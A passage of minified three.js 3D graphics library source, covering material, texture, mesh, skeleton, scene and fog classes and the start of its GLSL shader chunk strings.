a};THREE.RawShaderMaterial=function(a){THREE.ShaderMaterial.call(this,a);this.type=\"RawShaderMaterial\"};THREE.RawShaderMaterial.prototype=Object.create(THREE.ShaderMaterial.prototype);THREE.RawShaderMaterial.prototype.constructor=THREE.RawShaderMaterial;\nTHREE.SpriteMaterial=function(a){THREE.Material.call(this);this.type=\"SpriteMaterial\";this.color=new THREE.Color(16777215);this.map=null;this.rotation=0;this.lights=this.fog=!1;this.setValues(a)};THREE.SpriteMaterial.prototype=Object.create(THREE.Material.prototype);THREE.SpriteMaterial.prototype.constructor=THREE.SpriteMaterial;THREE.SpriteMaterial.prototype.copy=function(a){THREE.Material.prototype.copy.call(this,a);this.color.copy(a.color);this.map=a.map;this.rotation=a.rotation;return this};\nTHREE.ShadowMaterial=function(){THREE.ShaderMaterial.call(this,{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.lights,{opacity:{value:1}}]),vertexShader:THREE.ShaderChunk.shadow_vert,fragmentShader:THREE.ShaderChunk.shadow_frag});this.transparent=this.lights=!0;Object.defineProperties(this,{opacity:{enumerable:!0,get:function(){return this.uniforms.opacity.value},set:function(a){this.uniforms.opacity.value=a}}})};THREE.ShadowMaterial.prototype=Object.create(THREE.ShaderMaterial.prototype);\nTHREE.ShadowMaterial.prototype.constructor=THREE.ShadowMaterial;\nTHREE.Texture=function(a,b,c,d,e,f,g,h,k,l){Object.defineProperty(this,\"id\",{value:THREE.TextureIdCount++});this.uuid=THREE.Math.generateUUID();this.sourceFile=this.name=\"\";this.image=void 0!==a?a:THREE.Texture.DEFAULT_IMAGE;this.mipmaps=[];this.mapping=void 0!==b?b:THREE.Texture.DEFAULT_MAPPING;this.wrapS=void 0!==c?c:THREE.ClampToEdgeWrapping;this.wrapT=void 0!==d?d:THREE.ClampToEdgeWrapping;this.magFilter=void 0!==e?e:THREE.LinearFilter;this.minFilter=void 0!==f?f:THREE.LinearMipMapLinearFilter;\nthis.anisotropy=void 0!==k?k:1;this.format=void 0!==g?g:THREE.RGBAFormat;this.type=void 0!==h?h:THREE.UnsignedByteType;this.offset=new THREE.Vector2(0,0);this.repeat=new THREE.Vector2(1,1);this.generateMipmaps=!0;this.premultiplyAlpha=!1;this.flipY=!0;this.unpackAlignment=4;this.encoding=void 0!==l?l:THREE.LinearEncoding;this.version=0;this.onUpdate=null};THREE.Texture.DEFAULT_IMAGE=void 0;THREE.Texture.DEFAULT_MAPPING=THREE.UVMapping;\nTHREE.Texture.prototype={constructor:THREE.Texture,set needsUpdate(a){!0===a&&this.version++},clone:function(){return(new this.constructor).copy(this)},copy:function(a){this.image=a.image;this.mipmaps=a.mipmaps.slice(0);this.mapping=a.mapping;this.wrapS=a.wrapS;this.wrapT=a.wrapT;this.magFilter=a.magFilter;this.minFilter=a.minFilter;this.anisotropy=a.anisotropy;this.format=a.format;this.type=a.type;this.offset.copy(a.offset);this.repeat.copy(a.repeat);this.generateMipmaps=a.generateMipmaps;this.premultiplyAlpha=\na.premultiplyAlpha;this.flipY=a.flipY;this.unpackAlignment=a.unpackAlignment;this.encoding=a.encoding;return this},toJSON:function(a){if(void 0!==a.textures[this.uuid])return a.textures[this.uuid];var b={metadata:{version:4.4,type:\"Texture\",generator:\"Texture.toJSON\"},uuid:this.uuid,name:this.name,mapping:this.mapping,repeat:[this.repeat.x,this.repeat.y],offset:[this.offset.x,this.offset.y],wrap:[this.wrapS,this.wrapT],minFilter:this.minFilter,magFilter:this.magFilter,anisotropy:this.anisotropy};\nif(void 0!==this.image){var c=this.image;void 0===c.uuid&&(c.uuid=THREE.Math.generateUUID());if(void 0===a.images[c.uuid]){var d=a.images,e=c.uuid,f=c.uuid,g;void 0!==c.toDataURL?g=c:(g=document.createElementNS(\"http://www.w3.org/1999/xhtml\",\"canvas\"),g.width=c.width,g.height=c.height,g.getContext(\"2d\").drawImage(c,0,0,c.width,c.height));g=2048<g.width||2048<g.height?g.toDataURL(\"image/jpeg\",.6):g.toDataURL(\"image/png\");d[e]={uuid:f,url:g}}b.image=c.uuid}return a.textures[this.uuid]=b},dispose:function(){this.dispatchEvent({type:\"dispose\"})},\ntransformUv:function(a){if(this.mapping===THREE.UVMapping){a.multiply(this.repeat);a.add(this.offset);if(0>a.x||1<a.x)switch(this.wrapS){case THREE.RepeatWrapping:a.x-=Math.floor(a.x);break;case THREE.ClampToEdgeWrapping:a.x=0>a.x?0:1;break;case THREE.MirroredRepeatWrapping:1===Math.abs(Math.floor(a.x)%2)?a.x=Math.ceil(a.x)-a.x:a.x-=Math.floor(a.x)}if(0>a.y||1<a.y)switch(this.wrapT){case THREE.RepeatWrapping:a.y-=Math.floor(a.y);break;case THREE.ClampToEdgeWrapping:a.y=0>a.y?0:1;break;case THREE.MirroredRepeatWrapping:1===\nMath.abs(Math.floor(a.y)%2)?a.y=Math.ceil(a.y)-a.y:a.y-=Math.floor(a.y)}this.flipY&&(a.y=1-a.y)}}};Object.assign(THREE.Texture.prototype,THREE.EventDispatcher.prototype);THREE.TextureIdCount=0;\nTHREE.DepthTexture=function(a,b,c,d,e,f,g,h,k){THREE.Texture.call(this,null,d,e,f,g,h,THREE.DepthFormat,c,k);this.image={width:a,height:b};this.type=void 0!==c?c:THREE.UnsignedShortType;this.magFilter=void 0!==g?g:THREE.NearestFilter;this.minFilter=void 0!==h?h:THREE.NearestFilter;this.generateMipmaps=this.flipY=!1};THREE.DepthTexture.prototype=Object.create(THREE.Texture.prototype);THREE.DepthTexture.prototype.constructor=THREE.DepthTexture;\nTHREE.CanvasTexture=function(a,b,c,d,e,f,g,h,k){THREE.Texture.call(this,a,b,c,d,e,f,g,h,k);this.needsUpdate=!0};THREE.CanvasTexture.prototype=Object.create(THREE.Texture.prototype);THREE.CanvasTexture.prototype.constructor=THREE.CanvasTexture;THREE.CubeTexture=function(a,b,c,d,e,f,g,h,k,l){a=void 0!==a?a:[];b=void 0!==b?b:THREE.CubeReflectionMapping;THREE.Texture.call(this,a,b,c,d,e,f,g,h,k,l);this.flipY=!1};THREE.CubeTexture.prototype=Object.create(THREE.Texture.prototype);\nTHREE.CubeTexture.prototype.constructor=THREE.CubeTexture;Object.defineProperty(THREE.CubeTexture.prototype,\"images\",{get:function(){return this.image},set:function(a){this.image=a}});THREE.CompressedTexture=function(a,b,c,d,e,f,g,h,k,l,n,p){THREE.Texture.call(this,null,f,g,h,k,l,d,e,n,p);this.image={width:b,height:c};this.mipmaps=a;this.generateMipmaps=this.flipY=!1};THREE.CompressedTexture.prototype=Object.create(THREE.Texture.prototype);THREE.CompressedTexture.prototype.constructor=THREE.CompressedTexture;\nTHREE.DataTexture=function(a,b,c,d,e,f,g,h,k,l,n,p){THREE.Texture.call(this,null,f,g,h,k,l,d,e,n,p);this.image={data:a,width:b,height:c};this.magFilter=void 0!==k?k:THREE.NearestFilter;this.minFilter=void 0!==l?l:THREE.NearestFilter;this.generateMipmaps=this.flipY=!1};THREE.DataTexture.prototype=Object.create(THREE.Texture.prototype);THREE.DataTexture.prototype.constructor=THREE.DataTexture;\nTHREE.VideoTexture=function(a,b,c,d,e,f,g,h,k){function l(){requestAnimationFrame(l);a.readyState>=a.HAVE_CURRENT_DATA&&(n.needsUpdate=!0)}THREE.Texture.call(this,a,b,c,d,e,f,g,h,k);this.generateMipmaps=!1;var n=this;l()};THREE.VideoTexture.prototype=Object.create(THREE.Texture.prototype);THREE.VideoTexture.prototype.constructor=THREE.VideoTexture;THREE.Group=function(){THREE.Object3D.call(this);this.type=\"Group\"};THREE.Group.prototype=Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.Group});\nTHREE.Points=function(a,b){THREE.Object3D.call(this);this.type=\"Points\";this.geometry=void 0!==a?a:new THREE.BufferGeometry;this.material=void 0!==b?b:new THREE.PointsMaterial({color:16777215*Math.random()})};\nTHREE.Points.prototype=Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.Points,raycast:function(){var a=new THREE.Matrix4,b=new THREE.Ray,c=new THREE.Sphere;return function(d,e){function f(a,c){var f=b.distanceSqToPoint(a);if(f<n){var h=b.closestPointToPoint(a);h.applyMatrix4(k);var m=d.ray.origin.distanceTo(h);m<d.near||m>d.far||e.push({distance:m,distanceToRay:Math.sqrt(f),point:h.clone(),index:c,face:null,object:g})}}var g=this,h=this.geometry,k=this.matrixWorld,l=d.params.Points.threshold;\nnull===h.boundingSphere&&h.computeBoundingSphere();c.copy(h.boundingSphere);c.applyMatrix4(k);if(!1!==d.ray.intersectsSphere(c)){a.getInverse(k);b.copy(d.ray).applyMatrix4(a);var l=l/((this.scale.x+this.scale.y+this.scale.z)/3),n=l*l,l=new THREE.Vector3;if(h instanceof THREE.BufferGeometry){var p=h.index,h=h.attributes.position.array;if(null!==p)for(var m=p.array,p=0,q=m.length;p<q;p++){var r=m[p];l.fromArray(h,3*r);f(l,r)}else for(p=0,m=h.length/3;p<m;p++)l.fromArray(h,3*p),f(l,p)}else for(l=h.vertices,\np=0,m=l.length;p<m;p++)f(l[p],p)}}}(),clone:function(){return(new this.constructor(this.geometry,this.material)).copy(this)}});THREE.Line=function(a,b,c){if(1===c)return console.warn(\"THREE.Line: parameter THREE.LinePieces no longer supported. Created THREE.LineSegments instead.\"),new THREE.LineSegments(a,b);THREE.Object3D.call(this);this.type=\"Line\";this.geometry=void 0!==a?a:new THREE.BufferGeometry;this.material=void 0!==b?b:new THREE.LineBasicMaterial({color:16777215*Math.random()})};\nTHREE.Line.prototype=Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.Line,raycast:function(){var a=new THREE.Matrix4,b=new THREE.Ray,c=new THREE.Sphere;return function(d,e){var f=d.linePrecision,f=f*f,g=this.geometry,h=this.matrixWorld;null===g.boundingSphere&&g.computeBoundingSphere();c.copy(g.boundingSphere);c.applyMatrix4(h);if(!1!==d.ray.intersectsSphere(c)){a.getInverse(h);b.copy(d.ray).applyMatrix4(a);var k=new THREE.Vector3,l=new THREE.Vector3,h=new THREE.Vector3,n=\nnew THREE.Vector3,p=this instanceof THREE.LineSegments?2:1;if(g instanceof THREE.BufferGeometry){var m=g.index,q=g.attributes.position.array;if(null!==m)for(var m=m.array,g=0,r=m.length-1;g<r;g+=p){var s=m[g+1];k.fromArray(q,3*m[g]);l.fromArray(q,3*s);s=b.distanceSqToSegment(k,l,n,h);s>f||(n.applyMatrix4(this.matrixWorld),s=d.ray.origin.distanceTo(n),s<d.near||s>d.far||e.push({distance:s,point:h.clone().applyMatrix4(this.matrixWorld),index:g,face:null,faceIndex:null,object:this}))}else for(g=0,r=\nq.length/3-1;g<r;g+=p)k.fromArray(q,3*g),l.fromArray(q,3*g+3),s=b.distanceSqToSegment(k,l,n,h),s>f||(n.applyMatrix4(this.matrixWorld),s=d.ray.origin.distanceTo(n),s<d.near||s>d.far||e.push({distance:s,point:h.clone().applyMatrix4(this.matrixWorld),index:g,face:null,faceIndex:null,object:this}))}else if(g instanceof THREE.Geometry)for(k=g.vertices,l=k.length,g=0;g<l-1;g+=p)s=b.distanceSqToSegment(k[g],k[g+1],n,h),s>f||(n.applyMatrix4(this.matrixWorld),s=d.ray.origin.distanceTo(n),s<d.near||s>d.far||\ne.push({distance:s,point:h.clone().applyMatrix4(this.matrixWorld),index:g,face:null,faceIndex:null,object:this}))}}}(),clone:function(){return(new this.constructor(this.geometry,this.material)).copy(this)}});THREE.LineSegments=function(a,b){THREE.Line.call(this,a,b);this.type=\"LineSegments\"};THREE.LineSegments.prototype=Object.assign(Object.create(THREE.Line.prototype),{constructor:THREE.LineSegments});\nTHREE.Mesh=function(a,b){THREE.Object3D.call(this);this.type=\"Mesh\";this.geometry=void 0!==a?a:new THREE.BufferGeometry;this.material=void 0!==b?b:new THREE.MeshBasicMaterial({color:16777215*Math.random()});this.drawMode=THREE.TrianglesDrawMode;this.updateMorphTargets()};\nTHREE.Mesh.prototype=Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.Mesh,setDrawMode:function(a){this.drawMode=a},copy:function(a){THREE.Object3D.prototype.copy.call(this,a);this.drawMode=a.drawMode;return this},updateMorphTargets:function(){if(void 0!==this.geometry.morphTargets&&0<this.geometry.morphTargets.length){this.morphTargetBase=-1;this.morphTargetInfluences=[];this.morphTargetDictionary={};for(var a=0,b=this.geometry.morphTargets.length;a<b;a++)this.morphTargetInfluences.push(0),\nthis.morphTargetDictionary[this.geometry.morphTargets[a].name]=a}},getMorphTargetIndexByName:function(a){if(void 0!==this.morphTargetDictionary[a])return this.morphTargetDictionary[a];console.warn(\"THREE.Mesh.getMorphTargetIndexByName: morph target \"+a+\" does not exist. Returning 0.\");return 0},raycast:function(){function a(a,b,c,d,e,g,f){THREE.Triangle.barycoordFromPoint(a,b,c,d,s);e.multiplyScalar(s.x);g.multiplyScalar(s.y);f.multiplyScalar(s.z);e.add(g).add(f);return e.clone()}function b(a,b,c,\nd,e,g,f){var h=a.material;if(null===(h.side===THREE.BackSide?c.intersectTriangle(g,e,d,!0,f):c.intersectTriangle(d,e,g,h.side!==THREE.DoubleSide,f)))return null;u.copy(f);u.applyMatrix4(a.matrixWorld);c=b.ray.origin.distanceTo(u);return c<b.near||c>b.far?null:{distance:c,point:u.clone(),object:a}}function c(c,d,e,f,l,p,n,s){g.fromArray(f,3*p);h.fromArray(f,3*n);k.fromArray(f,3*s);if(c=b(c,d,e,g,h,k,t))l&&(m.fromArray(l,2*p),q.fromArray(l,2*n),r.fromArray(l,2*s),c.uv=a(t,g,h,k,m,q,r)),c.face=new THREE.Face3(p,\nn,s,THREE.Triangle.normal(g,h,k)),c.faceIndex=p;return c}var d=new THREE.Matrix4,e=new THREE.Ray,f=new THREE.Sphere,g=new THREE.Vector3,h=new THREE.Vector3,k=new THREE.Vector3,l=new THREE.Vector3,n=new THREE.Vector3,p=new THREE.Vector3,m=new THREE.Vector2,q=new THREE.Vector2,r=new THREE.Vector2,s=new THREE.Vector3,t=new THREE.Vector3,u=new THREE.Vector3;return function(v,s){var w=this.geometry,u=this.material,z=this.matrixWorld;if(void 0!==u&&(null===w.boundingSphere&&w.computeBoundingSphere(),f.copy(w.boundingSphere),\nf.applyMatrix4(z),!1!==v.ray.intersectsSphere(f)&&(d.getInverse(z),e.copy(v.ray).applyMatrix4(d),null===w.boundingBox||!1!==e.intersectsBox(w.boundingBox)))){var y,A;if(w instanceof THREE.BufferGeometry){var I,B,u=w.index,z=w.attributes,w=z.position.array;void 0!==z.uv&&(y=z.uv.array);if(null!==u)for(var z=u.array,F=0,K=z.length;F<K;F+=3){if(u=z[F],I=z[F+1],B=z[F+2],A=c(this,v,e,w,y,u,I,B))A.faceIndex=Math.floor(F/3),s.push(A)}else for(F=0,K=w.length;F<K;F+=9)if(u=F/3,I=u+1,B=u+2,A=c(this,v,e,w,y,\nu,I,B))A.index=u,s.push(A)}else if(w instanceof THREE.Geometry){var P,M,z=u instanceof THREE.MultiMaterial,F=!0===z?u.materials:null,K=w.vertices;I=w.faces;B=w.faceVertexUvs[0];0<B.length&&(y=B);for(var H=0,L=I.length;H<L;H++){var O=I[H];A=!0===z?F[O.materialIndex]:u;if(void 0!==A){B=K[O.a];P=K[O.b];M=K[O.c];if(!0===A.morphTargets){A=w.morphTargets;var N=this.morphTargetInfluences;g.set(0,0,0);h.set(0,0,0);k.set(0,0,0);for(var Q=0,J=A.length;Q<J;Q++){var D=N[Q];if(0!==D){var G=A[Q].vertices;g.addScaledVector(l.subVectors(G[O.a],\nB),D);h.addScaledVector(n.subVectors(G[O.b],P),D);k.addScaledVector(p.subVectors(G[O.c],M),D)}}g.add(B);h.add(P);k.add(M);B=g;P=h;M=k}if(A=b(this,v,e,B,P,M,t))y&&(N=y[H],m.copy(N[0]),q.copy(N[1]),r.copy(N[2]),A.uv=a(t,B,P,M,m,q,r)),A.face=O,A.faceIndex=H,s.push(A)}}}}}}(),clone:function(){return(new this.constructor(this.geometry,this.material)).copy(this)}});THREE.Bone=function(a){THREE.Object3D.call(this);this.type=\"Bone\";this.skin=a};\nTHREE.Bone.prototype=Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.Bone,copy:function(a){THREE.Object3D.prototype.copy.call(this,a);this.skin=a.skin;return this}});\nTHREE.Skeleton=function(a,b,c){this.useVertexTexture=void 0!==c?c:!0;this.identityMatrix=new THREE.Matrix4;a=a||[];this.bones=a.slice(0);this.useVertexTexture?(a=Math.sqrt(4*this.bones.length),a=THREE.Math.nextPowerOfTwo(Math.ceil(a)),this.boneTextureHeight=this.boneTextureWidth=a=Math.max(a,4),this.boneMatrices=new Float32Array(this.boneTextureWidth*this.boneTextureHeight*4),this.boneTexture=new THREE.DataTexture(this.boneMatrices,this.boneTextureWidth,this.boneTextureHeight,THREE.RGBAFormat,THREE.FloatType)):\nthis.boneMatrices=new Float32Array(16*this.bones.length);if(void 0===b)this.calculateInverses();else if(this.bones.length===b.length)this.boneInverses=b.slice(0);else for(console.warn(\"THREE.Skeleton bonInverses is the wrong length.\"),this.boneInverses=[],b=0,a=this.bones.length;b<a;b++)this.boneInverses.push(new THREE.Matrix4)};\nObject.assign(THREE.Skeleton.prototype,{calculateInverses:function(){this.boneInverses=[];for(var a=0,b=this.bones.length;a<b;a++){var c=new THREE.Matrix4;this.bones[a]&&c.getInverse(this.bones[a].matrixWorld);this.boneInverses.push(c)}},pose:function(){for(var a,b=0,c=this.bones.length;b<c;b++)(a=this.bones[b])&&a.matrixWorld.getInverse(this.boneInverses[b]);b=0;for(c=this.bones.length;b<c;b++)if(a=this.bones[b])a.parent instanceof THREE.Bone?(a.matrix.getInverse(a.parent.matrixWorld),a.matrix.multiply(a.matrixWorld)):\na.matrix.copy(a.matrixWorld),a.matrix.decompose(a.position,a.quaternion,a.scale)},update:function(){var a=new THREE.Matrix4;return function(){for(var b=0,c=this.bones.length;b<c;b++)a.multiplyMatrices(this.bones[b]?this.bones[b].matrixWorld:this.identityMatrix,this.boneInverses[b]),a.toArray(this.boneMatrices,16*b);this.useVertexTexture&&(this.boneTexture.needsUpdate=!0)}}(),clone:function(){return new THREE.Skeleton(this.bones,this.boneInverses,this.useVertexTexture)}});\nTHREE.SkinnedMesh=function(a,b,c){THREE.Mesh.call(this,a,b);this.type=\"SkinnedMesh\";this.bindMode=\"attached\";this.bindMatrix=new THREE.Matrix4;this.bindMatrixInverse=new THREE.Matrix4;a=[];if(this.geometry&&void 0!==this.geometry.bones){for(var d,e=0,f=this.geometry.bones.length;e<f;++e)d=this.geometry.bones[e],b=new THREE.Bone(this),a.push(b),b.name=d.name,b.position.fromArray(d.pos),b.quaternion.fromArray(d.rotq),void 0!==d.scl&&b.scale.fromArray(d.scl);e=0;for(f=this.geometry.bones.length;e<f;++e)d=\nthis.geometry.bones[e],-1!==d.parent&&null!==d.parent&&void 0!==a[d.parent]?a[d.parent].add(a[e]):this.add(a[e])}this.normalizeSkinWeights();this.updateMatrixWorld(!0);this.bind(new THREE.Skeleton(a,void 0,c),this.matrixWorld)};\nTHREE.SkinnedMesh.prototype=Object.assign(Object.create(THREE.Mesh.prototype),{constructor:THREE.SkinnedMesh,bind:function(a,b){this.skeleton=a;void 0===b&&(this.updateMatrixWorld(!0),this.skeleton.calculateInverses(),b=this.matrixWorld);this.bindMatrix.copy(b);this.bindMatrixInverse.getInverse(b)},pose:function(){this.skeleton.pose()},normalizeSkinWeights:function(){if(this.geometry instanceof THREE.Geometry)for(var a=0;a<this.geometry.skinWeights.length;a++){var b=this.geometry.skinWeights[a],c=\n1/b.lengthManhattan();Infinity!==c?b.multiplyScalar(c):b.set(1,0,0,0)}else if(this.geometry instanceof THREE.BufferGeometry)for(var b=new THREE.Vector4,d=this.geometry.attributes.skinWeight,a=0;a<d.count;a++)b.x=d.getX(a),b.y=d.getY(a),b.z=d.getZ(a),b.w=d.getW(a),c=1/b.lengthManhattan(),Infinity!==c?b.multiplyScalar(c):b.set(1,0,0,0),d.setXYZW(a,b.x,b.y,b.z,b.w)},updateMatrixWorld:function(a){THREE.Mesh.prototype.updateMatrixWorld.call(this,!0);\"attached\"===this.bindMode?this.bindMatrixInverse.getInverse(this.matrixWorld):\n\"detached\"===this.bindMode?this.bindMatrixInverse.getInverse(this.bindMatrix):console.warn(\"THREE.SkinnedMesh unrecognized bindMode: \"+this.bindMode)},clone:function(){return(new this.constructor(this.geometry,this.material,this.skeleton.useVertexTexture)).copy(this)}});THREE.LOD=function(){THREE.Object3D.call(this);this.type=\"LOD\";Object.defineProperties(this,{levels:{enumerable:!0,value:[]}})};\nTHREE.LOD.prototype=Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.LOD,copy:function(a){THREE.Object3D.prototype.copy.call(this,a,!1);a=a.levels;for(var b=0,c=a.length;b<c;b++){var d=a[b];this.addLevel(d.object.clone(),d.distance)}return this},addLevel:function(a,b){void 0===b&&(b=0);b=Math.abs(b);for(var c=this.levels,d=0;d<c.length&&!(b<c[d].distance);d++);c.splice(d,0,{distance:b,object:a});this.add(a)},getObjectForDistance:function(a){for(var b=this.levels,c=1,d=b.length;c<\nd&&!(a<b[c].distance);c++);return b[c-1].object},raycast:function(){var a=new THREE.Vector3;return function(b,c){a.setFromMatrixPosition(this.matrixWorld);var d=b.ray.origin.distanceTo(a);this.getObjectForDistance(d).raycast(b,c)}}(),update:function(){var a=new THREE.Vector3,b=new THREE.Vector3;return function(c){var d=this.levels;if(1<d.length){a.setFromMatrixPosition(c.matrixWorld);b.setFromMatrixPosition(this.matrixWorld);c=a.distanceTo(b);d[0].object.visible=!0;for(var e=1,f=d.length;e<f;e++)if(c>=\nd[e].distance)d[e-1].object.visible=!1,d[e].object.visible=!0;else break;for(;e<f;e++)d[e].object.visible=!1}}}(),toJSON:function(a){a=THREE.Object3D.prototype.toJSON.call(this,a);a.object.levels=[];for(var b=this.levels,c=0,d=b.length;c<d;c++){var e=b[c];a.object.levels.push({object:e.object.uuid,distance:e.distance})}return a}});THREE.Sprite=function(a){THREE.Object3D.call(this);this.type=\"Sprite\";this.material=void 0!==a?a:new THREE.SpriteMaterial};\nTHREE.Sprite.prototype=Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.Sprite,raycast:function(){var a=new THREE.Vector3;return function(b,c){a.setFromMatrixPosition(this.matrixWorld);var d=b.ray.distanceSqToPoint(a);d>this.scale.x*this.scale.y/4||c.push({distance:Math.sqrt(d),point:this.position,face:null,object:this})}}(),clone:function(){return(new this.constructor(this.material)).copy(this)}});\nTHREE.LensFlare=function(a,b,c,d,e){THREE.Object3D.call(this);this.lensFlares=[];this.positionScreen=new THREE.Vector3;this.customUpdateCallback=void 0;void 0!==a&&this.add(a,b,c,d,e)};\nTHREE.LensFlare.prototype=Object.assign(Object.create(THREE.Object3D.prototype),{constructor:THREE.LensFlare,copy:function(a){THREE.Object3D.prototype.copy.call(this,a);this.positionScreen.copy(a.positionScreen);this.customUpdateCallback=a.customUpdateCallback;for(var b=0,c=a.lensFlares.length;b<c;b++)this.lensFlares.push(a.lensFlares[b]);return this},add:function(a,b,c,d,e,f){void 0===b&&(b=-1);void 0===c&&(c=0);void 0===f&&(f=1);void 0===e&&(e=new THREE.Color(16777215));void 0===d&&(d=THREE.NormalBlending);\nc=Math.min(c,Math.max(0,c));this.lensFlares.push({texture:a,size:b,distance:c,x:0,y:0,z:0,scale:1,rotation:0,opacity:f,color:e,blending:d})},updateLensFlares:function(){var a,b=this.lensFlares.length,c,d=2*-this.positionScreen.x,e=2*-this.positionScreen.y;for(a=0;a<b;a++)c=this.lensFlares[a],c.x=this.positionScreen.x+d*c.distance,c.y=this.positionScreen.y+e*c.distance,c.wantedRotation=c.x*Math.PI*.25,c.rotation+=.25*(c.wantedRotation-c.rotation)}});\nTHREE.Scene=function(){THREE.Object3D.call(this);this.type=\"Scene\";this.overrideMaterial=this.fog=this.background=null;this.autoUpdate=!0};THREE.Scene.prototype=Object.create(THREE.Object3D.prototype);THREE.Scene.prototype.constructor=THREE.Scene;\nTHREE.Scene.prototype.copy=function(a,b){THREE.Object3D.prototype.copy.call(this,a,b);null!==a.background&&(this.background=a.background.clone());null!==a.fog&&(this.fog=a.fog.clone());null!==a.overrideMaterial&&(this.overrideMaterial=a.overrideMaterial.clone());this.autoUpdate=a.autoUpdate;this.matrixAutoUpdate=a.matrixAutoUpdate;return this};THREE.Fog=function(a,b,c){this.name=\"\";this.color=new THREE.Color(a);this.near=void 0!==b?b:1;this.far=void 0!==c?c:1E3};\nTHREE.Fog.prototype.clone=function(){return new THREE.Fog(this.color.getHex(),this.near,this.far)};THREE.FogExp2=function(a,b){this.name=\"\";this.color=new THREE.Color(a);this.density=void 0!==b?b:2.5E-4};THREE.FogExp2.prototype.clone=function(){return new THREE.FogExp2(this.color.getHex(),this.density)};THREE.ShaderChunk={};THREE.ShaderChunk.alphamap_fragment=\"#ifdef USE_ALPHAMAP\\n\\tdiffuseColor.a *= texture2D( alphaMap, vUv ).g;\\n#endif\\n\";THREE.ShaderChunk.alphamap_pars_fragment=\"#ifdef USE_ALPHAMAP\\n\\tuniform sampler2D alphaMap;\\n#endif\\n\";\nTHREE.ShaderChunk.alphatest_fragment=\"#ifdef ALPHATEST\\n\\tif ( diffuseColor.a < ALPHATEST ) discard;\\n#endif\\n\";THREE.ShaderChunk.aomap_fragment=\"#ifdef USE_AOMAP\\n\\tfloat ambientOcclusion = ( texture2D( aoMap, vUv2 ).r - 1.0 ) * aoMapIntensity + 1.0;\\n\\treflectedLight.indirectDiffuse *= ambientOcclusion;\\n\\t#if defined( USE_ENVMAP ) && defined( PHYSICAL )\\n\\t\\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\\n\\t\\treflectedLight.indirectSpecular *= computeSpecularOcclusion( dotNV, ambientOcclusion, material.specularRoughness );\\n\\t#endif\\n#endif\\n\";\nTHREE.ShaderChunk.aomap_pars_fragment=\"#ifdef USE_AOMAP\\n\\tuniform sampler2D aoMap;\\n\\tuniform float aoMapIntensity;\\n#endif\";THREE.ShaderChunk.begin_vertex=\"\\nvec3 transformed = vec3( position );\\n\";THREE.ShaderChunk.beginnormal_vertex=\"\\nvec3 objectNormal = vec3( normal );\\n\";THREE.ShaderChunk.bsdfs=\"bool testLightInRange( const in float lightDistance, const in float cutoffDistance ) {\\n\\treturn any( bvec2( cutoffDistance == 0.0, lightDistance < cutoffDistance ) );\\n}\\nfloat punctualLightIntensityToIrradianceFactor( const in float lightDistance, const in float cutoffDistance, const in float decayExponent ) {\\n\\t\\tif( decayExponent > 0.0 ) {\\n#if defined ( PHYSICALLY_CORRECT_LIGHTS )\\n\\t\\t\\tfloat distanceFalloff = 1.0 / max( pow( lightDistance, decayExponent ), 0.01 );\\n\\t\\t\\tfloat maxDistanceCutoffFactor = pow2( saturate( 1.0 - pow4( lightDistance / cutoffDistance ) ) );\\n\\t\\t\\treturn distanceFalloff * maxDistanceCutoffFactor;\\n#else\\n\\t\\t\\treturn pow( saturate( -lightDistance / cutoffDistance + 1.0 ), decayExponent );\\n#endif\\n\\t\\t}\\n\\t\\treturn 1.0;\\n}\\nvec3 BRDF_Diffuse_Lambert( const in vec3 diffuseColor ) {\\n\\treturn RECIPROCAL_PI * diffuseColor;\\n}\\nvec3 F_Schlick( const in vec3 specularColor, const in float dotLH ) {\\n\\tfloat fresnel = exp2( ( -5.55473 * dotLH - 6.98316 ) * dotLH );\\n\\treturn ( 1.0 - specularColor ) * fresnel + specularColor;\\n}\\nfloat G_GGX_Smith( const in float alpha, const in float dotNL, const in float dotNV ) {\\n\\tfloat a2 = pow2( alpha );\\n\\tfloat gl = dotNL + sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNL ) );\\n\\tfloat gv = dotNV + sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNV ) );\\n\\treturn 1.0 / ( gl * gv );\\n}\\nfloat G_GGX_SmithCorrelated( const in float alpha, const in float dotNL, const in float dotNV ) {\\n\\tfloat a2 = pow2( alpha );\\n\\tfloat gv = dotNL * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNV ) );\\n\\tfloat gl = dotNV * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNL ) );\\n\\treturn 0.5 / max( gv + gl, EPSILON );\\n}\\nfloat D_GGX( const in float alpha, const in float dotNH ) {\\n\\tfloat a2 = pow2( alpha );\\n\\tfloat denom = pow2( dotNH ) * ( a2 - 1.0 ) + 1.0;\\n\\treturn RECIPROCAL_PI * a2 / pow2( denom );\\n}\\nvec3 BRDF_Specular_GGX( const in IncidentLight incidentLight, const in GeometricContext geometry, const in vec3 specularColor, const in float roughness ) {\\n\\tfloat alpha = pow2( roughness );\\n\\tvec3 halfDir = normalize( incidentLight.direction + geometry.viewDir );\\n\\tfloat dotNL = saturate( dot( geometry.normal, incidentLight.direction ) );\\n\\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\\n\\tfloat dotNH = saturate( dot( geometry.normal, halfDir ) );\\n\\tfloat dotLH = saturate( dot( incidentLight.direction, halfDir ) );\\n\\tvec3 F = F_Schlick( specularColor, dotLH );\\n\\tfloat G = G_GGX_SmithCorrelated( alpha, dotNL, dotNV );\\n\\tfloat D = D_GGX( alpha, dotNH );\\n\\treturn F * ( G * D );\\n}\\nvec3 BRDF_Specular_GGX_Environment( const in GeometricContext geometry, const in vec3 specularColor, const in float roughness ) {\\n\\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\\n\\tconst vec4 c0 = vec4( - 1, - 0.0275, - 0.572, 0.022 );\\n\\tconst vec4 c1 = vec4( 1, 0.0425, 1.04, - 0.04 );\\n\\tvec4 r = roughness * c0 + c1;\\n\\tfloat a004 = min( r.x * r.x, exp2( - 9.28 * dotNV ) ) * r.x + r.y;\\n\\tvec2 AB = vec2( -1.04, 